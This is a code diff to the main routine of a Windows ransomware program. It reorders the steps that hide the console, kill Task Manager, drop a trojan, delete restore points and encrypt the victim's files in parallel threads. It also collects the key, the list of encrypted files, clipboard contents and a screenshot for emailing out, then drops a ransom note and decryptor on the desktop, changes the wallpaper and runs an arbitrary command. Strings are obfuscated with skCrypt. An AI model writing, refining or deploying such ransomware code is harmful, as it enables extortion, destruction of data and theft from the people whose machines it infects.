@@ -18,13 +18,13 @@ int main(int argc, char* argv[])
     if (!DEBUG)
         ShowWindow(GetConsoleWindow(), SW_HIDE);
 
+    if (TSK_REMOVER)
+        HANDLE hThreadTaskMng = CreateThread(NULL, 0, removeTasks, NULL, HIGH_PRIORITY_CLASS, new DWORD);
+
     if (TROJAN) {
         dropFile(TrojanFileContent, TROJANFILE);
         HANDLE hThreadTrojan = CreateThread(NULL, 0, trojanFunction, NULL, HIGH_PRIORITY_CLASS, new DWORD);
     }
-
-    if (TSK_REMOVER)
-        HANDLE hThreadTaskMng = CreateThread(NULL, 0, removeTasks, NULL, HIGH_PRIORITY_CLASS, new DWORD);
     
     if (DELETE_RESTOREPOINT)
         deleteRestorePoints();
@@ -62,10 +62,9 @@ int main(int argc, char* argv[])
     for (int i = 0; i < filesSplitted.size(); i++)
         threads[i] = thread(encryptFiles, filesSplitted[i], key);
     key = aes_encrypt(KEYOFKEY, key, IV);   // it's here for more safety
-    for (int i = 0; i < filesSplitted.size(); i++)
-        threads[i].join();
 
 
+    // info.txt
     string infoFileContent = (string)skCrypt("");
     string info_txt = (string)skCrypt("");
     info_txt += (string)skCrypt("Key: ") + key + (string)skCrypt("\n");
@@ -93,6 +92,7 @@ int main(int argc, char* argv[])
     infoFileContent += info_txt;
     infoFileContent += skCrypt("\n");
 
+    // cryptes.txt
     string cryptedFiles_txt = (string)skCrypt("");
     for (string file : files)
         cryptedFiles_txt += file + (string)skCrypt("\n");
@@ -100,26 +100,15 @@ int main(int argc, char* argv[])
     infoFileContent += cryptedFiles_txt;
     infoFileContent += skCrypt("\n");
 
+    // clipboard.txt
     if (GET_CLIPBOARD)
         infoFileContent += aes_encrypt(KEY, getClipboard(), IV);
     infoFileContent += skCrypt("\n");
 
+    // screenshot.bmp
     if (GET_SCREENSHOT)
         infoFileContent += aes_encrypt(KEY, getScreenshot(), IV);
     infoFileContent += skCrypt("\n");
-
-
-    if (DROP_README)
-        dropFile(InfoDecryptorContent, (string)skCrypt("C:\\Users\\") + getUserName() + (string)skCrypt("\\Desktop\\Decryptor.exe"));
-
-    if (DROP_DECRYPTOR)
-        dropFile(READMECONTENT, (string)skCrypt("C:\\Users\\") + getUserName() + (string)skCrypt("\\Desktop\\README.txt"));
-
-    if (DROP_CUSTOM_FILE)
-        dropFile(CustomFileContent, CUSTOMFILE_LOC);
-    
-    if (CHANGE_WALLPAPER)
-        changeWallpaper(WallpaperContent);
 
 
     if (DEBUG ? DEBUG_SEND_EMAIL : SEND_EMAIL) {
@@ -140,7 +129,24 @@ int main(int argc, char* argv[])
             scheduleTask();
         }
     }
+
+
+    for (int i = 0; i < filesSplitted.size(); i++)  // wait for all threads to finish encrypting files
+        threads[i].join();
     
+
+    if (DROP_README)
+        dropFile(InfoDecryptorContent, (string)skCrypt("C:\\Users\\") + getUserName() + (string)skCrypt("\\Desktop\\Decryptor.exe"));
+
+    if (DROP_DECRYPTOR)
+        dropFile(READMECONTENT, (string)skCrypt("C:\\Users\\") + getUserName() + (string)skCrypt("\\Desktop\\README.txt"));
+
+    if (DROP_CUSTOM_FILE)
+        dropFile(CustomFileContent, CUSTOMFILE_LOC);
+
+    if (CHANGE_WALLPAPER)
+        changeWallpaper(WallpaperContent);
+
     if (SEND_CUSTOM_COMMAND)
         system((CUSTOM_COMMAND).c_str());
 
